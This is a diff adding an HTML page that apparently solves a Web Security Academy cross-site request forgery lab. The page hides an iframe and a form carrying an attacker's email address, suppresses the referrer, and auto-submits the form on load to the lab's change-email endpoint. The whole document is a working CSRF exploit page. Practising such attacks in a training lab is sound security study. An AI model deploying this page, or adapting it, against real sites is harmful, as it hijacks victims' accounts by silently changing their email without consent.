@@ -1,0 +1,20 @@
+<html>
+<head> 
+ <meta name="referrer" content="no-referrer" />
+ </head>
+ 
+    <body>
+        <h1>Hello Victim!</h1>
+
+    <!--we are using iframe to hide the email box on the page -->
+
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        
+        <form action="https://acbb1f7f1f3148c7c0c523c50008000c.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="h4cker@h4ckers.com">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
+                 
